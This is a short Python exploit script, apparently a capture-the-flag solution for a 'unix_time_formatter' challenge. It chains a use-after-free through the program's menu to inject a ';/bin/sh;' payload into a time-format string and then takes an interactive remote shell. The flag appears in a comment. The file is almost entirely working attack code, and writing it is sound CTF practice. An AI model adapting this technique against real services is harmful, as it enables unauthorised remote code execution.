import pwnbox


# PCTF{use_after_free_isnt_so_bad}

local = False

if local:
    p = pwnbox.pipe.ProcessPipe('gdb -q unix_time_formatter_9a0c42cadcb931cce0f9b7a1b4037c6b')
else:
    p = pwnbox.pipe.SocketPipe('unix.pwning.xxx',9999)

payload = '\';/bin/sh;\''

def lobby():
    p.read_until('5) Exit.\n')
    p.read_until('>')


def set_timeFormat(s):
    p.write('1\n')
    p.read_until('mat:')
    p.write(s+'\n')
    lobby()

def set_time(d):
    p.write('2\n')
    p.read_until('time: ')
    p.write('%d\n' % d)
    lobby()

def exit(s):
    p.write('5\n')
    p.read_until(')?')
    p.write(s+'\n')
    lobby()

def set_timeZone(s):
    p.write('3\n')
    p.read_until('zone:')
    p.write(s+'\n')
    lobby()

if local:
    p.read_until('(gdb)')
    p.write('r\n')


lobby()
set_timeFormat('a'*len(payload))
set_time(1)
exit('N')
set_timeZone(payload)
p.write('4\n')
p.interact()

